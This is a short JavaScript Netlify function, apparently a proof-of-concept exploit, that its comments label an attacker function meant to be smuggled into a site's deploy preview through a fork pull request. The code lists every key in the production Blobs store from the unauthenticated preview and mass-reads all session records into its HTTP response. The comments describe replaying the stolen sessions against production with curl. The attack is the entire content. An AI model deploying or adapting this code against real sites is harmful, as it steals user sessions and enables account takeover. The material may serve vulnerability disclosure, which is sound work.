// ATTACKER function, deployed by an external fork PR into the victim's Deploy Preview.
// Base dir: sponge/ ; path: sponge/netlify/functions/blob-mass.js ; package.json dep: @netlify/blobs
// Invoked at: https://deploy-preview-<PR>--<site>.netlify.app/.netlify/functions/blob-mass
//
// Zero-victim-interaction MASS session-store read. No write, no poisoning, no XSS in this
// function — pure confidentiality read of the production Blobs store from the unauthenticated
// preview runtime, then enumerates every session:* key it finds. This is the "attacker reads the
// entire session store" step; the follow-up replay against production /.netlify/functions/me is
// done separately, plain curl, no browser involved.
import { getStore } from "@netlify/blobs";

export default async (req, context) => {
  const out = { ts: new Date().toISOString(), steps: {} };
  const safe = async (n, f) => { try { out.steps[n] = await f(); } catch (e) { out.steps[n] = { error: String(e).slice(0, 300) }; } };
  const store = getStore("production"); // getStore = site-wide store, shared with production

  // 1. Enumerate every key in the production store from the untrusted preview
  let allKeys = [];
  await safe("list_all_keys", async () => {
    allKeys = (await store.list()).blobs.map(b => b.key);
    return allKeys;
  });

  // 2. Filter for session records and MASS-READ every one of them. Zero victim interaction:
  //    this runs purely because the fork PR opened a deploy preview; no victim clicked, loaded,
  //    or did anything.
  const sessionKeys = allKeys.filter(k => k.startsWith("session:"));
  await safe("mass_read_sessions", async () => {
    const results = {};
    for (const key of sessionKeys) {
      const raw = await store.get(key);
      results[key] = raw;
    }
    return results;
  });

  out.session_key_count = sessionKeys.length;
  return new Response(JSON.stringify(out, null, 2), { headers: { "content-type": "application/json", "cache-control": "no-store" } });
};
